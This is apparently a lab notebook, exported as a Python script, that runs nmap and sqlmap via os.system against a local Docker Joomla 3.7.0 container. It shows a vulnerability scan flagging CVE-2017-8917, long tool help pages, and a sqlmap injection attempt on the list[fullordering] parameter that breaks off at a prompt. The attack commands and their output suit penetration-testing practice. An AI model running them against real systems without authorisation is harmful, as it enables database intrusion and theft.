# %%
import os

# %% [markdown]
# Importation des module snecessaire

# %%
os.system('nmap')
# Out:
# Nmap 7.80 ( https://nmap.org )
# Usage: nmap [Scan Type(s)] [Options] {target specification}
# TARGET SPECIFICATION:
#   Can pass hostnames, IP addresses, networks, etc.
#   Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
#   -iL <inputfilename>: Input from list of hosts/networks
#   -iR <num hosts>: Choose random targets
#   --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
#   --excludefile <exclude_file>: Exclude list from file
# HOST DISCOVERY:
#   -sL: List Scan - simply list targets to scan
#   -sn: Ping Scan - disable port scan
#   -Pn: Treat all hosts as online -- skip host discovery
#   -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
#   -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
#   -PO[protocol list]: IP Protocol Ping
#   -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
#   --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
#   --system-dns: Use OS's DNS resolver
#   --traceroute: Trace hop path to each host
# SCAN TECHNIQUES:
#   -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
#   -sU: UDP Scan
#   -sN/sF/sX: TCP Null, FIN, and Xmas scans
#   --scanflags <flags>: Customize TCP scan flags
#   -sI <zombie host[:probeport]>: Idle scan
#   -sY/sZ: SCTP INIT/COOKIE-ECHO scans
#   -sO: IP protocol scan
#   -b <FTP relay host>: FTP bounce scan
# PORT SPECIFICATION AND SCAN ORDER:
#   -p <port ranges>: Only scan specified ports
#     Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
#   --exclude-ports <port ranges>: Exclude the specified ports from scanning
#   -F: Fast mode - Scan fewer ports than the default scan
#   -r: Scan ports consecutively - don't randomize
#   --top-ports <number>: Scan <number> most common ports
#   --port-ratio <ratio>: Scan ports more common than <ratio>
# SERVICE/VERSION DETECTION:
#   -sV: Probe open ports to determine service/version info
#   --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
#   --version-light: Limit to most likely probes (intensity 2)
#   --version-all: Try every single probe (intensity 9)
#   --version-trace: Show detailed version scan activity (for debugging)
# SCRIPT SCAN:
#   -sC: equivalent to --script=default
#   --script=<Lua scripts>: <Lua scripts> is a comma separated list of
#            directories, script-files or script-categories
#   --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
#   --script-args-file=filename: provide NSE script args in a file
#   --script-trace: Show all data sent and received
#   --script-updatedb: Update the script database.
#   --script-help=<Lua scripts>: Show help about scripts.
#            <Lua scripts> is a comma-separated list of script-files or
#            script-categories.
# OS DETECTION:
#   -O: Enable OS detection
#   --osscan-limit: Limit OS detection to promising targets
#   --osscan-guess: Guess OS more aggressively
# TIMING AND PERFORMANCE:
#   Options which take <time> are in seconds, or append 'ms' (milliseconds),
#   's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
#   -T<0-5>: Set timing template (higher is faster)
#   --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
#   --min-parallelism/max-parallelism <numprobes>: Probe parallelization
#   --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
#       probe round trip time.
#   --max-retries <tries>: Caps number of port scan probe retransmissions.
#   --host-timeout <time>: Give up on target after this long
#   --scan-delay/--max-scan-delay <time>: Adjust delay between probes
#   --min-rate <number>: Send packets no slower than <number> per second
#   --max-rate <number>: Send packets no faster than <number> per second
# FIREWALL/IDS EVASION AND SPOOFING:
#   -f; --mtu <val>: fragment packets (optionally w/given MTU)
#   -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
#   -S <IP_Address>: Spoof source address
#   -e <iface>: Use specified interface
#   -g/--source-port <portnum>: Use given port number
#   --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
#   --data <hex string>: Append a custom payload to sent packets
#   --data-string <string>: Append a custom ASCII string to sent packets
#   --data-length <num>: Append random data to sent packets
#   --ip-options <options>: Send packets with specified ip options
#   --ttl <val>: Set IP time-to-live field
#   --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
#   --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
# OUTPUT:
#   -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
#      and Grepable format, respectively, to the given filename.
#   -oA <basename>: Output in the three major formats at once
#   -v: Increase verbosity level (use -vv or more for greater effect)
#   -d: Increase debugging level (use -dd or more for greater effect)
#   --reason: Display the reason a port is in a particular state
#   --open: Only show open (or possibly open) ports
#   --packet-trace: Show all packets sent and received
#   --iflist: Print host interfaces and routes (for debugging)
#   --append-output: Append to rather than clobber specified output files
#   --resume <filename>: Resume an aborted scan
#   --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
#   --webxml: Reference stylesheet from Nmap.Org for more portable XML
#   --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
# MISC:
#   -6: Enable IPv6 scanning
#   -A: Enable OS detection, version detection, script scanning, and traceroute
#   --datadir <dirname>: Specify custom Nmap data file location
#   --send-eth/--send-ip: Send using raw ethernet frames or IP packets
#   --privileged: Assume that the user is fully privileged
#   --unprivileged: Assume the user lacks raw socket privileges
#   -V: Print version number
#   -h: Print this help summary page.
# EXAMPLES:
#   nmap -v -A scanme.nmap.org
#   nmap -v -sn 192.168.0.0/16 10.0.0.0/8
#   nmap -v -iR 10000 -Pn -p 80
# SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
# 65280

# %% [markdown]
# Importation des module snecessaire

# %%
os.system('nmap -u joomla370')
# Out:
# Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-20 13:33 UTC
# Nmap scan report for joomla370 (172.23.0.5)
# Host is up (0.0030s latency).
# rDNS record for 172.23.0.5: joomla370.docker-joomla-master-370_default
# Not shown: 999 closed ports
# PORT   STATE SERVICE
# 80/tcp open  http
#
# Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
# 0

# %%
os.system('nmap -u joomla370 -p 80 --script vuln')
# Out:
# Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-20 13:33 UTC
# Nmap scan report for joomla370 (172.23.0.5)
# Host is up (0.0017s latency).
# rDNS record for 172.23.0.5: joomla370.docker-joomla-master-370_default
#
# PORT   STATE SERVICE
# 80/tcp open  http
# |_clamav-exec: ERROR: Script execution failed (use -d to debug)
# | http-csrf:
# | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=joomla370
# |   Found the following possible CSRF vulnerabilities:
# |
# |     Path: http://joomla370:80/
# |     Form id: mod-search-searchword63
# |     Form action: /index.php
# |
# |     Path: http://joomla370:80/
# |     Form id: login-form
# |     Form action: /index.php
# |
# |     Path: http://joomla370:80/index.php/using-joomla/extensions/plugins
# |     Form id: mod-search-searchword63
# |     Form action: /index.php/using-joomla/extensions/plugins
# |
# |     Path: http://joomla370:80/index.php/sample-sites
# |     Form id: mod-search-searchword63
# |     Form action: /index.php/sample-sites
# |
# |     Path: http://joomla370:80/index.php/using-joomla/extensions
# |     Form id: mod-search-searchword63
# |     Form action: /index.php/using-joomla/extensions
# |
# |     Path: http://joomla370:80/index.php/using-joomla/extensions/templates
# |     Form id: mod-search-searchword63
# |     Form action: /index.php/using-joomla/extensions/templates
# |
# |     Path: http://joomla370:80/index.php/using-joomla/extensions/templates
# |     Form id: adminform
# |     Form action: http://joomla370/index.php/using-joomla/extensions/templates
# |
# |     Path: http://joomla370:80/index.php/login
# |     Form id: mod-search-searchword63
# |     Form action: /index.php/login
# |
# |     Path: http://joomla370:80/index.php/login
# |     Form id: username-lbl
# |     Form action: /index.php/login?task=user.login
# |
# |     Path: http://joomla370:80/index.php/site-map
# |     Form id: mod-search-searchword63
# |     Form action: /index.php/site-map
# |
# |     Path: http://joomla370:80/index.php/the-joomla-community
# |     Form id: mod-search-searchword63
# |     Form action: /index.php/the-joomla-community
# |
# |     Path: http://joomla370:80/index.php/using-joomla/getting-help
# |     Form id: mod-search-searchword63
# |     Form action: /index.php/using-joomla/getting-help
# |
# |     Path: http://joomla370:80/administrator/
# |     Form id: form-login
# |     Form action: /administrator/index.php
# |
# |     Path: http://joomla370:80/index.php/using-joomla/extensions/modules
# |     Form id: mod-search-searchword63
# |     Form action: /index.php/using-joomla/extensions/modules
# |
# |     Path: http://joomla370:80/index.php/using-joomla/extensions/modules
# |     Form id: adminform
# |_    Form action: http://joomla370/index.php/using-joomla/extensions/modules
# | http-dombased-xss:
# | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=joomla370
# |   Found the following indications of potential DOM based XSS:
# |
# |     Source: window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no')
# |_    Pages: http://joomla370:80/index.php/sample-sites, http://joomla370:80/index.php/site-map, http://joomla370:80/index.php/the-joomla-community, http://joomla370:80/index.php/using-joomla/getting-help
# | http-enum:
# |   /administrator/: Possible admin folder
# |   /administrator/index.php: Possible admin folder
# |   /robots.txt: Robots file
# |   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
# |   /language/en-GB/en-GB.xml: Joomla version 3.7.0
# |   /htaccess.txt: Joomla!
# |   /README.txt: Interesting, a readme.
# |   /bin/: Potentially interesting folder
# |   /cache/: Potentially interesting folder
# |   /images/: Potentially interesting folder
# |   /includes/: Potentially interesting folder
# |   /libraries/: Potentially interesting folder
# |   /modules/: Potentially interesting folder
# |   /templates/: Potentially interesting folder
# |_  /tmp/: Potentially interesting folder
# |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
# | http-vuln-cve2017-8917:
# |   VULNERABLE:
# |   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
# |     State: VULNERABLE
# |     IDs:  CVE:CVE-2017-8917
# |     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
# |       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
# |       to execute aribitrary SQL commands via unspecified vectors.
# |
# |     Disclosure date: 2017-05-17
# |     Extra information:
# |       User: ead_user@172.23.0.5
# |     References:
# |       https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917
#
# Nmap done: 1 IP address (1 host up) scanned in 79.54 seconds
# 0

# %%
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal"')
# Out:
#         ___
#        __H__
#  ___ ___[.]_____ ___ ___  {1.4.4#stable}
# |_ -| . [.]     | .'| . |
# |___|_  ["]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:35:14 /2022-04-20/
#
# >?47h8[13:35:15] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://joomla370:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# you have not declared cookie(s), while server wants to set its own ('16ecd03278f46e4a6f358c90f0c01dd3=7121a310028...84f6330cdd'). Do you want to use those [Y/n] Y
# [13:35:17] [INFO] checking if the target is protected by some kind of WAF/IPS
# [13:35:17] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
# are you sure that you want to continue with further target testing? [Y/n] Y
# [13:35:17] [WARNING] please consider usage of tamper scripts (option '--tamper')
# [13:35:17] [INFO] testing if the target URL content is stable
# [13:35:18] [WARNING] GET parameter 'option' does not appear to be dynamic
# [13:35:18] [WARNING] heuristic (basic) test shows that GET parameter 'option' might not be injectable
# [13:35:19] [INFO] testing for SQL injection on GET parameter 'option'
# [13:35:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
# [13:35:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
# [13:35:24] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [13:35:25] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
# [13:35:27] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
# [13:35:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
# [13:35:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
# [13:35:31] [INFO] testing 'Generic inline queries'
# [13:35:31] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
# [13:35:32] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
# [13:35:34] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
# [13:35:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
# [13:35:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
# [13:35:38] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
# [13:35:40] [INFO] testing 'Oracle AND time-based blind'
# it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
# [13:35:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
# [13:35:43] [WARNING] GET parameter 'option' does not seem to be injectable
# [13:35:43] [WARNING] GET parameter 'view' does not appear to be dynamic
# [13:35:44] [WARNING] heuristic (basic) test shows that GET parameter 'view' might not be injectable
# [13:35:44] [INFO] testing for SQL injection on GET parameter 'view'
# [13:35:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
# [13:35:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
# [13:35:48] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [13:35:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
# [13:35:52] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
# [13:35:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
# [13:35:56] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
# [13:35:56] [INFO] testing 'Generic inline queries'
# [13:35:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
# [13:35:58] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
# [13:35:59] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
# [13:36:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
# [13:36:02] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
# [13:36:04] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
# [13:36:05] [INFO] testing 'Oracle AND time-based blind'
# [13:36:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
# [13:36:11] [WARNING] GET parameter 'view' does not seem to be injectable
# [13:36:11] [WARNING] GET parameter 'layout' does not appear to be dynamic
# [13:36:11] [WARNING] heuristic (basic) test shows that GET parameter 'layout' might not be injectable
# [13:36:12] [INFO] testing for SQL injection on GET parameter 'layout'
# [13:36:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
# [13:36:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
# [13:36:16] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [13:36:18] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
# [13:36:19] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
# [13:36:21] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
# [13:36:22] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
# [13:36:23] [INFO] testing 'Generic inline queries'
# [13:36:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
# [13:36:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
# [13:36:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
# [13:36:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
# [13:36:29] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
# [13:36:30] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
# [13:36:32] [INFO] testing 'Oracle AND time-based blind'
# [13:36:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
# [13:36:37] [WARNING] GET parameter 'layout' does not seem to be injectable
# [13:36:37] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
# [13:36:37] [WARNING] HTTP error codes detected during run:
# 404 (Not Found) - 74 times, 500 (Internal Server Error) - 156 times
# [13:36:37] [WARNING] you haven't updated sqlmap for more than 747 days!!!
#
# [*] ending @ 13:36:37 /2022-04-20/
# 0

# %%
os.system('sqlmap -hh')
# Out:
#         ___
#        __H__
#  ___ ___["]_____ ___ ___  {1.4.4#stable}
# |_ -| . [)]     | .'| . |
# |___|_  [,]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# Usage: python3 sqlmap [options]
#
# Options:
#   -h, --help            Show basic help message and exit
#   -hh                   Show advanced help message and exit
#   --version             Show program's version number and exit
#   -v VERBOSE            Verbosity level: 0-6 (default 1)
#
#   Target:
#     At least one of these options has to be provided to define the
#     target(s)
#
#     -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
#     -d DIRECT           Connection string for direct database connection
#     -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
#     -m BULKFILE         Scan multiple targets given in a textual file
#     -r REQUESTFILE      Load HTTP request from a file
#     -g GOOGLEDORK       Process Google dork results as target URLs
#     -c CONFIGFILE       Load options from a configuration INI file
#
#   Request:
#     These options can be used to specify how to connect to the target URL
#
#     -A AGENT, --user..  HTTP User-Agent header value
#     -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
#     --method=METHOD     Force usage of given HTTP method (e.g. PUT)
#     --data=DATA         Data string to be sent through POST (e.g. "id=1")
#     --param-del=PARA..  Character used for splitting parameter values (e.g. &)
#     --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
#     --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
#     --load-cookies=L..  File containing cookies in Netscape/wget format
#     --drop-set-cookie   Ignore Set-Cookie header from response
#     --mobile            Imitate smartphone through HTTP User-Agent header
#     --random-agent      Use randomly selected HTTP User-Agent header value
#     --host=HOST         HTTP Host header value
#     --referer=REFERER   HTTP Referer header value
#     --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
#     --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
#     --auth-cred=AUTH..  HTTP authentication credentials (name:password)
#     --auth-file=AUTH..  HTTP authentication PEM cert/private key file
#     --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)
#     --ignore-proxy      Ignore system default proxy settings
#     --ignore-redirects  Ignore redirection attempts
#     --ignore-timeouts   Ignore connection timeouts
#     --proxy=PROXY       Use a proxy to connect to the target URL
#     --proxy-cred=PRO..  Proxy authentication credentials (name:password)
#     --proxy-file=PRO..  Load proxy list from a file
#     --tor               Use Tor anonymity network
#     --tor-port=TORPORT  Set Tor proxy port other than default
#     --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
#     --check-tor         Check to see if Tor is used properly
#     --delay=DELAY       Delay in seconds between each HTTP request
#     --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
#     --retries=RETRIES   Retries when the connection timeouts (default 3)
#     --randomize=RPARAM  Randomly change value for given parameter(s)
#     --safe-url=SAFEURL  URL address to visit frequently during testing
#     --safe-post=SAFE..  POST data to send to a safe URL
#     --safe-req=SAFER..  Load safe HTTP request from a file
#     --safe-freq=SAFE..  Regular requests between visits to a safe URL
#     --skip-urlencode    Skip URL encoding of payload data
#     --csrf-token=CSR..  Parameter used to hold anti-CSRF token
#     --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token
#     --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
#     --force-ssl         Force usage of SSL/HTTPS
#     --chunked           Use HTTP chunked transfer encoded (POST) requests
#     --hpp               Use HTTP parameter pollution method
#     --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
#                         "import hashlib;id2=hashlib.md5(id).hexdigest()")
#
#   Optimization:
#     These options can be used to optimize the performance of sqlmap
#
#     -o                  Turn on all optimization switches
#     --predict-output    Predict common queries output
#     --keep-alive        Use persistent HTTP(s) connections
#     --null-connection   Retrieve page length without actual HTTP response body
#     --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
#
#   Injection:
#     These options can be used to specify which parameters to test for,
#     provide custom injection payloads and optional tampering scripts
#
#     -p TESTPARAMETER    Testable parameter(s)
#     --skip=SKIP         Skip testing for given parameter(s)
#     --skip-static       Skip testing parameters that not appear to be dynamic
#     --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")
#     --param-filter=P..  Select testable parameter(s) by place (e.g. "POST")
#     --dbms=DBMS         Force back-end DBMS to provided value
#     --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
#     --os=OS             Force back-end DBMS operating system to provided value
#     --invalid-bignum    Use big numbers for invalidating values
#     --invalid-logical   Use logical operations for invalidating values
#     --invalid-string    Use random strings for invalidating values
#     --no-cast           Turn off payload casting mechanism
#     --no-escape         Turn off string escaping mechanism
#     --prefix=PREFIX     Injection payload prefix string
#     --suffix=SUFFIX     Injection payload suffix string
#     --tamper=TAMPER     Use given script(s) for tampering injection data
#
#   Detection:
#     These options can be used to customize the detection phase
#
#     --level=LEVEL       Level of tests to perform (1-5, default 1)
#     --risk=RISK         Risk of tests to perform (1-3, default 1)
#     --string=STRING     String to match when query is evaluated to True
#     --not-string=NOT..  String to match when query is evaluated to False
#     --regexp=REGEXP     Regexp to match when query is evaluated to True
#     --code=CODE         HTTP code to match when query is evaluated to True
#     --smart             Perform thorough tests only if positive heuristic(s)
#     --text-only         Compare pages based only on the textual content
#     --titles            Compare pages based only on their titles
#
#   Techniques:
#     These options can be used to tweak testing of specific SQL injection
#     techniques
#
#     --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
#     --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
#     --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
#     --union-char=UCHAR  Character to use for bruteforcing number of columns
#     --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
#     --dns-domain=DNS..  Domain name used for DNS exfiltration attack
#     --second-url=SEC..  Resulting page URL searched for second-order response
#     --second-req=SEC..  Load second-order HTTP request from file
#
#   Fingerprint:
#     -f, --fingerprint   Perform an extensive DBMS version fingerprint
#
#   Enumeration:
#     These options can be used to enumerate the back-end database
#     management system information, structure and data contained in the
#     tables
#
#     -a, --all           Retrieve everything
#     -b, --banner        Retrieve DBMS banner
#     --current-user      Retrieve DBMS current user
#     --current-db        Retrieve DBMS current database
#     --hostname          Retrieve DBMS server hostname
#     --is-dba            Detect if the DBMS current user is DBA
#     --users             Enumerate DBMS users
#     --passwords         Enumerate DBMS users password hashes
#     --privileges        Enumerate DBMS users privileges
#     --roles             Enumerate DBMS users roles
#     --dbs               Enumerate DBMS databases
#     --tables            Enumerate DBMS database tables
#     --columns           Enumerate DBMS database table columns
#     --schema            Enumerate DBMS schema
#     --count             Retrieve number of entries for table(s)
#     --dump              Dump DBMS database table entries
#     --dump-all          Dump all DBMS databases tables entries
#     --search            Search column(s), table(s) and/or database name(s)
#     --comments          Check for DBMS comments during enumeration
#     --statements        Retrieve SQL statements being run on DBMS
#     -D DB               DBMS database to enumerate
#     -T TBL              DBMS database table(s) to enumerate
#     -C COL              DBMS database table column(s) to enumerate
#     -X EXCLUDE          DBMS database identifier(s) to not enumerate
#     -U USER             DBMS user to enumerate
#     --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
#     --pivot-column=P..  Pivot column name
#     --where=DUMPWHERE   Use WHERE condition while table dumping
#     --start=LIMITSTART  First dump table entry to retrieve
#     --stop=LIMITSTOP    Last dump table entry to retrieve
#     --first=FIRSTCHAR   First query output word character to retrieve
#     --last=LASTCHAR     Last query output word character to retrieve
#     --sql-query=SQLQ..  SQL statement to be executed
#     --sql-shell         Prompt for an interactive SQL shell
#     --sql-file=SQLFILE  Execute SQL statements from given file(s)
#
#   Brute force:
#     These options can be used to run brute force checks
#
#     --common-tables     Check existence of common tables
#     --common-columns    Check existence of common columns
#     --common-files      Check existence of common files
#
#   User-defined function injection:
#     These options can be used to create custom user-defined functions
#
#     --udf-inject        Inject custom user-defined functions
#     --shared-lib=SHLIB  Local path of the shared library
#
#   File system access:
#     These options can be used to access the back-end database management
#     system underlying file system
#
#     --file-read=FILE..  Read a file from the back-end DBMS file system
#     --file-write=FIL..  Write a local file on the back-end DBMS file system
#     --file-dest=FILE..  Back-end DBMS absolute filepath to write to
#
#   Operating system access:
#     These options can be used to access the back-end database management
#     system underlying operating system
#
#     --os-cmd=OSCMD      Execute an operating system command
#     --os-shell          Prompt for an interactive operating system shell
#     --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
#     --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
#     --os-bof            Stored procedure buffer overflow exploitation
#     --priv-esc          Database process user privilege escalation
#     --msf-path=MSFPATH  Local path where Metasploit Framework is installed
#     --tmp-path=TMPPATH  Remote absolute path of temporary files directory
#
#   Windows registry access:
#     These options can be used to access the back-end database management
#     system Windows registry
#
#     --reg-read          Read a Windows registry key value
#     --reg-add           Write a Windows registry key value data
#     --reg-del           Delete a Windows registry key value
#     --reg-key=REGKEY    Windows registry key
#     --reg-value=REGVAL  Windows registry key value
#     --reg-data=REGDATA  Windows registry key value data
#     --reg-type=REGTYPE  Windows registry key value type
#
#   General:
#     These options can be used to set some general working parameters
#
#     -s SESSIONFILE      Load session from a stored (.sqlite) file
#     -t TRAFFICFILE      Log all HTTP traffic into a textual file
#     --answers=ANSWERS   Set predefined answers (e.g. "quit=N,follow=N")
#     --batch             Never ask for user input, use the default behavior
#     --binary-fields=..  Result fields having binary values (e.g. "digest")
#     --check-internet    Check Internet connection before assessing the target
#     --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
#     --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
#     --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
#     --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
#     --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")
#     --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
#     --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)
#     --eta               Display for each output the estimated time of arrival
#     --flush-session     Flush session files for current target
#     --forms             Parse and test forms on target URL
#     --fresh-queries     Ignore query results stored in session file
#     --gpage=GOOGLEPAGE  Use Google dork results from specified page number
#     --har=HARFILE       Log all HTTP traffic into a HAR file
#     --hex               Use hex conversion during data retrieval
#     --output-dir=OUT..  Custom output directory path
#     --parse-errors      Parse and display DBMS error messages from responses
#     --preprocess=PRE..  Use given script(s) for preprocessing of response data
#     --repair            Redump entries having unknown character marker (?)
#     --save=SAVECONFIG   Save options to a configuration INI file
#     --scope=SCOPE       Regexp for filtering targets
#     --skip-waf          Skip heuristic detection of WAF/IPS protection
#     --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
#     --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
#     --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
#     --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")
#
#   Miscellaneous:
#     These options do not fit into any other category
#
#     -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
#     --alert=ALERT       Run host OS command(s) when SQL injection is found
#     --beep              Beep on question and/or when SQL injection is found
#     --dependencies      Check for missing (optional) sqlmap dependencies
#     --disable-coloring  Disable console output coloring
#     --list-tampers      Display list of available tamper scripts
#     --offline           Work in offline mode (only use session data)
#     --purge             Safely remove all content from sqlmap data directory
#     --results-file=R..  Location of CSV results file in multiple targets mode
#     --sqlmap-shell      Prompt for an interactive sqlmap shell
#     --tmp-dir=TMPDIR    Local directory for storing temporary files
#     --unstable          Adjust options for unstable connections
#     --update            Update sqlmap
#     --wizard            Simple wizard interface for beginner users
# [13:36:39] [WARNING] you haven't updated sqlmap for more than 747 days!!!
# 0

# %%
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*"')
# Out:
#         ___
#        __H__
#  ___ ___[.]_____ ___ ___  {1.4.4#stable}
# |_ -| . [)]     | .'| . |
# |___|_  [(]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:36:40 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
